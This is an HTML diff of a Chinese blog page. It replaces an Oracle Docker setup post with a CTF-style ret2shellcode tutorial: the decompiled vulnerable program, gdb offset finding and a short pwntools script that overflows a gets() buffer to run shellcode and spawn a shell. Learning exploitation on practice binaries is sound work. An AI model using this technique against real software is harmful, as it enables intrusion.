@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="UTF-8" />
-    <title>Oracle数据库配置 | 雲流のLowest World</title>
+    <title>ret2shellcode | 雲流のLowest World</title>
     <meta name="author" content="C1oudfL0w0" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -85,7 +85,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E5%AE%89%E8%A3%85oracle-11g"><span class="toc-number">2.</span> <span class="toc-text">docker安装oracle_11g</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">3.</span> <span class="toc-text">例子</span></a></li></ol>
     </div>
   
 
@@ -233,14 +233,23 @@
 
                 <div class="article">
     <div>
-        <h1>Oracle数据库配置</h1>
+        <h1>ret2shellcode</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/11/8
+            2025/3/18
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Pwn
+            </a>
         </span>
         
         
@@ -253,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">175字</span>
+        <span class="post-count">556字</span>
       </span>
     </span>
 
@@ -262,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
     
@@ -278,40 +287,62 @@
     
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7063141828706435085">https://juejin.cn/post/7063141828706435085</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/javaboyweng/article/details/125486242">https://blog.csdn.net/javaboyweng/article/details/125486242</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode</a></p>
 <span id="more"></span>
 
 <hr>
-<h1 id="docker安装oracle-11g"><a href="#docker安装oracle-11g" class="headerlink" title="docker安装oracle_11g"></a>docker安装oracle_11g</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull iatebes/oracle_11g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>大概5g这样子，挺久的</p>
-<p>然后启动容器，配置一下 oracle 数据库端口在1521</p>
-<p>进入容器，快速开始</p>
-<p>在oracle用户下，进入sqlplus，使用 sys as sysdba 登录，解锁 scott 用户，查询表数据。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> oracle
-
-sqlplus /nolog
-
-conn sys/123456 as sysdba
-
-<span class="token comment"># alter user scott account unlock;</span>
-create user orcltt identified by orcltt<span class="token punctuation">;</span> <span class="token comment">#创建用户</span>
-grant connect,resource,dba to orcltt<span class="token punctuation">;</span> <span class="token comment">#权限</span>
-<span class="token comment"># conn scott/tiger (默认需要修改密码，重复输入新设置的密码即可)</span>
-
-SQL<span class="token operator">></span> <span class="token keyword">select</span> * from tab<span class="token punctuation">;</span>
-
-TNAME                          TABTYPE  CLUSTERID
------------------------------- ------- ----------
-BONUS                          TABLE
-DEPT                           TABLE
-EMP                            TABLE
-SALGRADE                       TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/blog/2024/11/08/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE/image-20241108003608841.png" alt="image-20241108003608841"></p>
-<p>其中的每个数据库的名字都代表着一个用户，如scott、sys</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote>
+<p>控制程序执行 shellcode 代码</p>
+</blockquote>
+<p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p>
+<p>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，<strong>shellcode 所在的区域具有可执行权限</strong></p>
+<p>注意，在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</p>
+<p>需要在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。这里采用 Ubuntu 18.04</p>
 <hr>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p><img src="/blog/2025/03/18/ret2shellcode/image-20250318223337453.png" alt="image-20250318223337453"></p>
+<p>几乎没保护，有 RWX 可读可写可执行权限</p>
+<p>反编译一下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>依旧是基本的 gets 栈溢出，这里把我们输入的字符串复制到了 buf2 处</p>
+<p><img src="/blog/2025/03/18/ret2shellcode/image-20250318224030809.png" alt="image-20250318224030809"></p>
+<p>这时我们调试下程序，看一下 bss 段是否是可执行的</p>
+<p>直接在 main 下断点并执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b main
+r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后使用<code>vmmap</code>查看程序各种段的地址和范围</p>
+<p><img src="/blog/2025/03/18/ret2shellcode/image-20250318224406057.png" alt="image-20250318224406057"></p>
+<p>可以看到 buf2 所在的 0x804a080 在 0x804a000 ~ 0x804b000 之间，具有 rwxp 权限，有可执行权限</p>
+<p>那么我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode</p>
+<p>先算偏移，IDA 给的是 0x64+0x4，但是测了一下没成功</p>
+<p>那么用 gdb 的 cyclic 算一下，先下断点，生成一长串字符填进去爆出溢出地址</p>
+<p><img src="/blog/2025/03/18/ret2shellcode/image-20250318230351739.png" alt="image-20250318230351739"></p>
+<p>然后用 <code>cyclic -l</code> 算出溢出长度</p>
+<p><img src="/blog/2025/03/18/ret2shellcode/image-20250318230413363.png" alt="image-20250318230413363"></p>
+<p>那么溢出长度就是 112</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/03/18/ret2shellcode/image-20250318230535405.png" alt="image-20250318230535405"></p>
 
     </div>
     
